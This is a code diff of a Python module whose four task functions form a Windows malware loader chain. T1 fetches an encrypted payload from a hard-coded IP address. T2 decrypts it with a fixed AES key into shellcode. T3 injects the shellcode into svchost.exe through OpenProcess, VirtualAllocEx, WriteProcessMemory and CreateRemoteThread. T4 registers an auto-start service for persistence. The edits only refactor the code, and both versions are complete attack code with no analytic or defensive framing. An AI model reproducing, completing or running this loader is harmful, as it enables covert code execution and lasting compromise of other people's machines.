@@ -13,12 +13,12 @@ def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        url = "https://192.168.156.189/api"
+        url = "https://192.168.117.139/api"
         response = requests.get(url, timeout=10)
         response.raise_for_status()
-        payload_data = response.content
+        encrypted_payload_hex = response.content.hex()
         result = {
-            'data': payload_data.hex(),
+            'data': encrypted_payload_hex,
             'url': url
         }
         return {'success': True, 'data': result,
@@ -31,8 +31,8 @@ def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        aes_key = b'ThisIsA16ByteKey'
-        aes_iv = b'ThisIsA16ByteIV_'
+        aes_key = b'This is a key123'
+        aes_iv = b'This is an IV456'
         encrypted_data = bytes.fromhex(input_data.get('data', ''))
         cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)
         decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
@@ -40,8 +40,8 @@ def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
     except Exception as e:
-        return {'success': False, 'data': {'shellcode': None},
-                'error': f'{type(e).__name__}: {e}',
+        result = {'shellcode': None}
+        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
 
 def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
@@ -49,35 +49,42 @@ def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     input_data = input_data or {}
     try:
         shellcode = bytes.fromhex(input_data.get('shellcode', ''))
-        process = subprocess.run(
-            ['tasklist', '/FI', 'IMAGENAME eq svchost.exe', '/FO', 'CSV'],
+        process_name = "svchost.exe"
+        result = subprocess.run(
+            ["tasklist", "/FI", f"IMAGENAME eq {process_name}", "/FO", "CSV"],
             capture_output=True, text=True, timeout=10
         )
-        process_lines = process.stdout.splitlines()
-        if len(process_lines) < 2:
+        lines = result.stdout.splitlines()
+        if len(lines) < 2:
             raise Exception("svchost.exe not found")
-        svchost_info = process_lines[1].split(',')
-        svchost_pid = int(svchost_info[1].strip('"'))
-        PROCESS_ALL_ACCESS = (0x1F0FFF)
-        kernel32 = ctypes.windll.kernel32
-        process_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, svchost_pid)
+        pid = int(lines[1].split(",")[1].strip('"'))
+        PROCESS_ALL_ACCESS = 0x1F0FFF
+        process_handle = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
         if not process_handle:
-            raise Exception("Failed to open svchost.exe process")
-        memory_allocation = kernel32.VirtualAllocEx(process_handle, 0, len(shellcode), 0x3000, 0x40)
-        if not memory_allocation:
-            raise Exception("Memory allocation failed")
+            raise Exception("Failed to open process")
+        shellcode_size = len(shellcode)
+        MEM_COMMIT = 0x1000
+        PAGE_EXECUTE_READWRITE = 0x40
+        remote_memory = ctypes.windll.kernel32.VirtualAllocEx(
+            process_handle, 0, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE
+        )
+        if not remote_memory:
+            raise Exception("Failed to allocate memory in target process")
         bytes_written = ctypes.c_size_t(0)
-        if not kernel32.WriteProcessMemory(process_handle, memory_allocation, shellcode, len(shellcode), ctypes.byref(bytes_written)):
+        if not ctypes.windll.kernel32.WriteProcessMemory(
+            process_handle, remote_memory, shellcode, shellcode_size, ctypes.byref(bytes_written)
+        ):
             raise Exception("Failed to write shellcode to process memory")
         thread_id = ctypes.c_ulong(0)
-        if not kernel32.CreateRemoteThread(process_handle, None, 0, memory_allocation, None, 0, ctypes.byref(thread_id)):
+        if not ctypes.windll.kernel32.CreateRemoteThread(
+            process_handle, None, 0, remote_memory, None, 0, ctypes.byref(thread_id)
+        ):
             raise Exception("Failed to create remote thread")
-        kernel32.CloseHandle(process_handle)
+        ctypes.windll.kernel32.CloseHandle(process_handle)
         return {'success': True, 'data': {'success': True},
                 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
     except Exception as e:
-        return {'success': False, 'data': {'success': False},
-                'error': f'{type(e).__name__}: {e}',
+        return {'success': False, 'data': {'success': False}, 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
 
 def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
@@ -87,20 +94,20 @@ def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     try:
         command = [
             "sc", "create", service_name,
-            "binPath=", "\"C:\\Path\\To\\Executable.exe\"",
+            "binPath=", "C:\\Path\\To\\YourExecutable.exe",
             "start=", "auto"
         ]
         subprocess.run(command, check=True, timeout=10)
         result = {
             "service_name": service_name,
-            "registered": True
+            "success": True
         }
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
     except Exception as e:
         result = {
             "service_name": service_name,
-            "registered": False
+            "success": False
         }
         return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
